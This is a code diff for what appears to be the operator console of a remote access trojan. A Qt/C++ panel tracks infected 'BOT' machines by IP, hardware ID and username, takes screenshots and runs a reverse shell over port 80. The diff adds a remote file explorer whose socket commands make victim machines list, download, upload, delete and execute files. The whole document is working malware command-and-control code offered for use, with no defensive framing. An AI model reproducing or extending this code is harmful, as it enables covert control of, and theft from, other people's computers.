@@ -2,13 +2,100 @@
 #include "sqlite3.h"
 #include "ui_mwindow.h"
 #include "ui_screenshot.h"
-#include "ui_explorer.h"
 #include "ui_wscreenshot.h"
+#include "ui_wexplorer.h"
 
 SOCKET          MSOCKETS[10000];
 QThread         *TRDS[10000];
 WSocket         *RVHD[10000];
 sqlite3*        db;
+
+WExplorer::WExplorer(QWidget *parent) :
+    QWidget(parent),
+    ui(new Ui::WExplorer)
+{
+    ui->setupUi(this);
+
+    ui->listWidgetClient->setContextMenuPolicy(Qt::CustomContextMenu);
+    ui->listWidgetServer->setContextMenuPolicy(Qt::CustomContextMenu);
+
+    menuClient = new QMenu(this);
+
+    DowloadFile = new QAction("Скачать файл", this);
+    connect(DowloadFile, SIGNAL(triggered()), this, SLOT(sDownloadFile()));
+    menuClient->addAction(DowloadFile);
+
+    ExecFile = new QAction("Запустить файл", this);
+    connect(ExecFile, SIGNAL(triggered()), this, SLOT(sExecFile()));
+    menuClient->addAction(ExecFile);
+
+    DelFile = new QAction("Удалить файл", this);
+    connect(DelFile, SIGNAL(triggered()), this, SLOT(sDelFile()));
+    menuClient->addAction(DelFile);
+
+    menuServer = new QMenu(this);
+
+    UplFile = new QAction("Передать файл", this);
+    connect(UplFile, SIGNAL(triggered()), this, SLOT(sDownloadFile()));
+    menuServer->addAction(UplFile);
+
+    connect(ui->listWidgetClient, SIGNAL(customContextMenuRequested(QPoint)), \
+            this, SLOT(sOpenCliMenu(QPoint)));
+    connect(ui->listWidgetServer, SIGNAL(customContextMenuRequested(QPoint)), \
+            this, SLOT(sOpenSrvMenu(QPoint)));
+}
+
+void WExplorer::sOpenCliMenu(QPoint pos)
+{
+    menuClient->popup(ui->listWidgetClient->viewport()->mapToGlobal(pos));
+}
+
+void WExplorer::sOpenSrvMenu(QPoint pos)
+{
+    menuServer->popup(ui->listWidgetServer->viewport()->mapToGlobal(pos));
+}
+
+WExplorer::~WExplorer()
+{
+    delete ui;
+}
+
+void WExplorer::GetFiles(int NOMER)
+{
+    //CMD_EXPLOR
+    this->SendingSocket = MSOCKETS[NOMER];
+
+}
+
+//void WExplorer::Release(QString Json, int NOMER)
+//{
+
+//}
+
+void WExplorer::SetCurrPath(int IDX, int NOMER)
+{
+
+}
+
+void WExplorer::DownloadFile(int IDX, int NOMER)
+{
+
+}
+
+void WExplorer::UploadFile(int IDX, int NOMER)
+{
+
+}
+
+void WExplorer::RemoveFile(int IDX, int NOMER)
+{
+
+}
+
+void WExplorer::ExecuteFile(int IDX, int NOMER)
+{
+
+}
 
 WScreenShot::WScreenShot(QWidget *parent) :
     QWidget(parent),
@@ -200,6 +287,100 @@ void WSocket::GetScreen(int NOMER)
     send(MSOCKETS[NOMER], (char*)&indata, sizeof(CMDiDATA), 0);
 }
 
+void WSocket::Release(QString Json, int NOMER)
+{
+
+}
+
+void WSocket::GetCurrPath(int NOMER)
+{
+    EXPLRR explr;
+    CMDiDATA indata;
+    memset(&indata, 0, sizeof(CMDiDATA));
+    memset(&explr, 0, sizeof(EXPLRR));
+    explr.DO = DO_GETCURPATH;
+    indata.CMD = CMD_EXPLOR;
+    memcpy(indata.DATA, &explr, sizeof(EXPLRR));
+    send(MSOCKETS[NOMER], (char*)&indata, sizeof(CMDiDATA), 0);
+    memset(&indata, 0, sizeof(CMDiDATA));
+    memset(&explr, 0, sizeof(EXPLRR));
+}
+
+void WSocket::SetCurrPath(int IDX, int NOMER)
+{
+    EXPLRR explr;
+    CMDiDATA indata;
+    memset(&indata, 0, sizeof(CMDiDATA));
+    memset(&explr, 0, sizeof(EXPLRR));
+    explr.DO = DO_SETCURPATH;
+    explr.IND = IDX;
+    indata.CMD = CMD_EXPLOR;
+    memcpy(indata.DATA, &explr, sizeof(EXPLRR));
+    send(MSOCKETS[NOMER], (char*)&indata, sizeof(CMDiDATA), 0);
+    memset(&indata, 0, sizeof(CMDiDATA));
+    memset(&explr, 0, sizeof(EXPLRR));
+}
+
+void WSocket::DownloadFile(int IDX, int NOMER)
+{
+    EXPLRR explr;
+    CMDiDATA indata;
+    memset(&indata, 0, sizeof(CMDiDATA));
+    memset(&explr, 0, sizeof(EXPLRR));
+    explr.DO = DO_DOWLDFILE;
+    explr.IND = IDX;
+    indata.CMD = CMD_EXPLOR;
+    memcpy(indata.DATA, &explr, sizeof(EXPLRR));
+    send(MSOCKETS[NOMER], (char*)&indata, sizeof(CMDiDATA), 0);
+    memset(&indata, 0, sizeof(CMDiDATA));
+    memset(&explr, 0, sizeof(EXPLRR));
+}
+
+void WSocket::UploadFile(int IDX, int NOMER)
+{
+    EXPLRR explr;
+    CMDiDATA indata;
+    memset(&indata, 0, sizeof(CMDiDATA));
+    memset(&explr, 0, sizeof(EXPLRR));
+    explr.DO = DO_UPLDFILE;
+    explr.IND = IDX;
+    indata.CMD = CMD_EXPLOR;
+    memcpy(indata.DATA, &explr, sizeof(EXPLRR));
+    send(MSOCKETS[NOMER], (char*)&indata, sizeof(CMDiDATA), 0);
+    memset(&indata, 0, sizeof(CMDiDATA));
+    memset(&explr, 0, sizeof(EXPLRR));
+}
+
+void WSocket::RemoveFile(int IDX, int NOMER)
+{
+    EXPLRR explr;
+    CMDiDATA indata;
+    memset(&indata, 0, sizeof(CMDiDATA));
+    memset(&explr, 0, sizeof(EXPLRR));
+    explr.DO = DO_REMFILE;
+    explr.IND = IDX;
+    indata.CMD = CMD_EXPLOR;
+    memcpy(indata.DATA, &explr, sizeof(EXPLRR));
+    send(MSOCKETS[NOMER], (char*)&indata, sizeof(CMDiDATA), 0);
+    memset(&indata, 0, sizeof(CMDiDATA));
+    memset(&explr, 0, sizeof(EXPLRR));
+}
+
+void WSocket::ExecuteFile(int IDX, int NOMER)
+{
+    EXPLRR explr;
+    CMDiDATA indata;
+    memset(&indata, 0, sizeof(CMDiDATA));
+    memset(&explr, 0, sizeof(EXPLRR));
+    explr.DO = DO_EXEC;
+    explr.IND = IDX;
+    indata.CMD = CMD_EXPLOR;
+    memcpy(indata.DATA, &explr, sizeof(EXPLRR));
+    send(MSOCKETS[NOMER], (char*)&indata, sizeof(CMDiDATA), 0);
+    memset(&indata, 0, sizeof(CMDiDATA));
+    memset(&explr, 0, sizeof(EXPLRR));
+}
+
 void WSocket::WaitShell()
 {
     char szBuffer[4096];
@@ -251,27 +432,27 @@ void WSocket::WaitShell()
 
 void WSocket::CheckOnline()
 {
-    sqlite3_stmt* stmt;
-    if (sqlite3_prepare_v2(db, "SELECT NOMER FROM BOT WHERE OTVET='1'", -1, &stmt, 0) == SQLITE_OK)
-    {
-        while (sqlite3_step(stmt) == SQLITE_ROW)
-        {
-            DWORD NOMER = sqlite3_column_int(stmt, 0);
-            if (recvStat(MSOCKETS[NOMER]) == FALSE)
-            {
-                char* ErrMsg = NULL;
-                char* zapros = new char[1000];
-                wsprintfA(zapros, "UPDATE BOT SET OTVET='0' WHERE NOMER='%d'", NOMER);
-                if (SQLITE_OK == sqlite3_exec(db, zapros, nullptr, nullptr, &ErrMsg))
-                {
-                    closesocket(MSOCKETS[NOMER]);
-                    emit DelClient(NOMER);
-                }
-                delete[] zapros;
-            }
-        }
-        sqlite3_finalize(stmt);
-    }
+//    sqlite3_stmt* stmt;
+//    if (sqlite3_prepare_v2(db, "SELECT NOMER FROM BOT WHERE OTVET='1'", -1, &stmt, 0) == SQLITE_OK)
+//    {
+//        while (sqlite3_step(stmt) == SQLITE_ROW)
+//        {
+//            DWORD NOMER = sqlite3_column_int(stmt, 0);
+//            if (recvStat(MSOCKETS[NOMER]) == FALSE)
+//            {
+//                char* ErrMsg = NULL;
+//                char* zapros = new char[1000];
+//                wsprintfA(zapros, "UPDATE BOT SET OTVET='0' WHERE NOMER='%d'", NOMER);
+//                if (SQLITE_OK == sqlite3_exec(db, zapros, nullptr, nullptr, &ErrMsg))
+//                {
+//                    closesocket(MSOCKETS[NOMER]);
+//                    emit DelClient(NOMER);
+//                }
+//                delete[] zapros;
+//            }
+//        }
+//        sqlite3_finalize(stmt);
+//    }
 }
 
 void WSocket::Recving(int NOMER)
@@ -283,6 +464,15 @@ void WSocket::Recving(int NOMER)
 
         if (sizeof(CMDiDATA) != recv(MSOCKETS[NOMER], (char*)&cmdProtocol, sizeof(CMDiDATA), 0))
         {
+            char* ErrMsg = NULL;
+            char* zapros = new char[1000];
+            wsprintfA(zapros, "UPDATE BOT SET OTVET='0' WHERE NOMER='%d'", NOMER);
+            if (SQLITE_OK == sqlite3_exec(db, zapros, nullptr, nullptr, &ErrMsg))
+            {
+                closesocket(MSOCKETS[NOMER]);
+                emit DelClient(NOMER);
+            }
+            delete[] zapros;
             break;
         }
 
@@ -519,6 +709,7 @@ MWindow::MWindow(QWidget *parent)
             this, SLOT(sOpenMenu(QPoint)));
 
     screenShot = new WScreenShot();
+    fileExplorer = new WExplorer();
 
     wsocket80 = new WSocket(80);
     sendHandl = new WSocket(80);
@@ -528,12 +719,21 @@ MWindow::MWindow(QWidget *parent)
     sendSocketThread = new QThread(this);
     shellSocketThread = new QThread(this);
 
+    connect(this, &MWindow::GetFiles, fileExplorer, &WExplorer::GetFiles);
+    connect(fileExplorer, &WExplorer::GetCurrPath, sendHandl, &WSocket::GetCurrPath);
+    connect(fileExplorer, &WExplorer::SetCurrPath, sendHandl, &WSocket::SetCurrPath);
+    connect(fileExplorer, &WExplorer::DownloadFile, sendHandl, &WSocket::DownloadFile);
+    connect(fileExplorer, &WExplorer::UploadFile, sendHandl, &WSocket::UploadFile);
+    connect(fileExplorer, &WExplorer::RemoveFile, sendHandl, &WSocket::RemoveFile);
+    connect(fileExplorer, &WExplorer::ExecuteFile, sendHandl, &WSocket::ExecuteFile);
+    //connect(sendHandl, &WSocket::Release, fileExplorer, &WExplorer::Release);
+
     connect(wsocket80, &WSocket::AddNewClient, this, &MWindow::AddNewClient);
-    connect(sendHandl, &WSocket::DelClient, this, &MWindow::DelClient);
+    //connect(sendHandl, &WSocket::DelClient, this, &MWindow::DelClient);
     connect(this, &MWindow::WaitClient, wsocket80, &WSocket::WaitClient);
     connect(this, SIGNAL(destroyed()), mainSocketThread, SLOT(quit()));
 
-    connect(this, &MWindow::CheckOnline, sendHandl, &WSocket::CheckOnline);
+    //connect(this, &MWindow::CheckOnline, sendHandl, &WSocket::CheckOnline);
     connect(this, &MWindow::ReversCmd, sendHandl, &WSocket::ReversCmd);
     connect(this, &MWindow::GetScreen, sendHandl, &WSocket::GetScreen);
 
@@ -589,6 +789,15 @@ void MWindow::sExplorer()
         if(QTableWidgetItem *item = ui->tableWidget->item(intROW, 0))
         {
             int NOMER = item->text().toInt();
+            if (fileExplorer->isVisible())
+            {
+                emit GetFiles(NOMER);
+            }
+            else
+            {
+                fileExplorer->show();
+                emit GetFiles(NOMER);
+            }
         }
     }
 }
@@ -641,6 +850,8 @@ void MWindow::AddNewClient(int NOMER, char *IP, char *HWID, char *USERNAME, char
 
     connect(this, &MWindow::Recving, RVHD[NOMER], &WSocket::Recving);
     connect(RVHD[NOMER], &WSocket::GetBitmap, screenShot, &WScreenShot::GetBitmap);
+    //connect(RVHD[NOMER], &WSocket::CheckOnline, sendHandl, &WSocket::CheckOnline);
+    connect(RVHD[NOMER], &WSocket::DelClient, this, &MWindow::DelClient);
     connect(this, SIGNAL(destroyed()), TRDS[NOMER], SLOT(quit()));
 
     RVHD[NOMER]->moveToThread(TRDS[NOMER]);
